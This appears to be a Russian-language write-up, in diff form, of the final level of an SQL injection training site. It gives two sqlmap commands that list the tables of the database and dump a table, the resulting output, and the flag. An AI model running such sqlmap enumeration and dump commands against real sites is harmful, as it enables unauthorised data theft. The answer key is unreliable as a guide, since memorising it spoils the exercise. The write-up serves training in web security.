@@ -1,0 +1,31 @@
+https://sql.training.hackerdom.ru/10lastlevel.php
+-------------------------------------------------
+
+Таблицы: неизвестно
+Поля: неизвестно
+Запрос: SELECT $text
+
+Не выводится ничего
+
+
+Не представляю как делать эту таску без sqlmap, но где то видел разбор на ютубе
+www.youtube.com/watch?v=dLSxTGvwcLw
+
+это примерный разбор
+
+первая команда:
+sqlmap -u "https://sql.training.hackerdom.ru/10lastlevel.php?text=1" -D sql_level10 -tables --batch 
+sqlmap -u "https://sql.training.hackerdom.ru/10lastlevel.php?text=1" -D sql_level10 -T davidblayne -dump --batch 
+
+
+
++------+--------+---------+----------+----------------+
+| wtf  | genius | first   | second   | chocolate      |
++------+--------+---------+----------+----------------+
+| wtf? | yes    | 55      | 44       | wantachocolate |
++------+--------+---------+----------+----------------+
+
+
+
+и вот ответ:
+wantachocolate
